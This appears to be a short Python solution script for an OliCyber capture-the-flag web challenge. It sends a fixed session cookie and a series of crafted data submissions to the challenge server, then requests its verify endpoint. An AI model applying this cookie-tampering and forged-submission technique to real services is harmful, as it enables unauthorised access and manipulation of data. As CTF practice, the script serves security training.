import requests

url = "http://rpo.challs.olicyber.it/"


cookies = {
    "hashish": "e179c5c68ee6cd4dda5fc0aef9b734511cc126b8a43352e64ece4e52362dbf37",
    "userID": "1"
}

for i in range(0,6):
    payload = {
        "p1s": str(i),
        "p2s": "0",
        "time": str(100*i)
    }
    data = requests.post(url+"data", data=payload, cookies=cookies).text
    print(data)

data = requests.get(url+"verify", cookies=cookies).text
print(data)
